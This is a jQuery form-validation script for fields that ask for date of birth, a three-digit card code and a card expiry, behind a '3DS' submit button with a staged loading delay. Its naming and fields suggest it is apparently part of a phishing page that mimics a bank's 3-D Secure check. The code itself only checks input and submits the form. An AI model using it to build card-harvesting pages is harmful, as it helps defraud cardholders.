$(document).ready(function(){
    setTimeout(function(){ 
        $('.transition').fadeOut();
    }, 2500);

    $('#xyssubmit3DSx').click(function(event){
    	event.preventDefault();
    	if($('#xysbirthdayDDx').val().length <= 0 || $('#xysbirthdayDDx').val() < 1 || $('#xysbirthdayDDx').val() > 31){
    		$('#xysbirthdayDDx').addClass('hasError');
    	}
    	else if($('#xysbirthdayMMx').val().length <= 0 || $('#xysbirthdayMMx').val() < 1 || $('#xysbirthdayMMx').val() > 12){
    		$('#xysbirthdayMMx').addClass('hasError');
    	}
    	else if($('#xysbirthdayYYx').val().length <= 0 || $('#xysbirthdayYYx').val() < 1910 || $('#xysbirthdayYYx').val() > 2005){
    		$('#xysbirthdayYYx').addClass('hasError');
    	}
    	else if($('#xyspanelcodex').val().length != 3){
    		$('#xyspanelcodex').addClass('hasError');
    	}
    	else if($('#xysexpirydateMMx').val().length <= 0 || $('#xysexpirydateMMx').val() < 1 || $('#xysexpirydateMMx').val() > 12){
    		$('#xysexpirydateMMx').addClass('hasError');
    	}
    	else if($('#xysexpirydateYYx').val().length <= 0 || $('#xysexpirydateYYx').val() < 18 || $('#xysexpirydateYYx').val() > 30){
    		$('#xysexpirydateYYx').addClass('hasError');
    	}
    	else {
            $('.transition').fadeIn();
            setTimeout(function(){ 
                $('form').submit();
            }, 2500);
    	}
    });

    $('input').focus(function(){
    	$(this).removeClass('hasError');
    });
});